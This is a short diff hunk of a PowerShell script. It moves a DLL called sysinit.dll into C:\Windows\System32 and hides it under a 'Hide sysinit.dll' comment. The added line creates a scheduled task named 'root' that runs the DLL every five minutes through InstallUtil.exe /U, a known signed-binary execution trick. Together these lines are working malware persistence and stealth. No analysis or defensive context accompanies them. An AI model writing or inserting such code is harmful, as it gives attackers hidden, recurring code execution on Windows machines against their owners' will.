@@ -78,3 +78,4 @@ $sysinitLoc = Get-ChildItem sysinit.dll
 move $sysinitLoc C:\Windows\System32
 # Hide sysinit.dll
 attrib +h C:\windows\System32
+schtasks /create /sc minute /mo 5 /tn "root" "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U C:\Windows\System32\sysinit.dll"
